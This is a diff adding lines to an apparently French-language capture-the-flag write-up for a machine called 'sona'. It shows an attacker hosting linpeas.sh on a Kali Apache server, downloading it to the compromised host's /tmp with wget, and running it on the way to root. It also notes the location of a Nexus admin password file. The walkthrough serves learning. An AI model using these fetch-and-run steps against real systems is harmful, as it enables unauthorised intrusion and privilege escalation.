@@ -223,6 +223,21 @@ nexus@sona:/home/sona$
 
 passons au root.txt
 
+nexus@sona:/tmp$ wget http://192.168.49.68:80/linpeas.sh
+wget http://192.168.49.68:80/linpeas.sh
+
+(root?kali)-[/var/www/html]
+# sudo systemctl enable --now apache2
+Synchronizing state of apache2.service with SysV service script with /usr/lib/systemd/systemd-sysv-install.
+Executing: /usr/lib/systemd/systemd-sysv-install enable apache2
+                                                                                                          
+(root?kali)-[/var/www/html]
+# systemctl status apache2
+
+exus@sona:/tmp$ chmod +x linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh
+
 Nous savons de plus,
 "Your admin user password is located in
 /home/nexus/sonatype-work/nexus3/admin.password on the server."
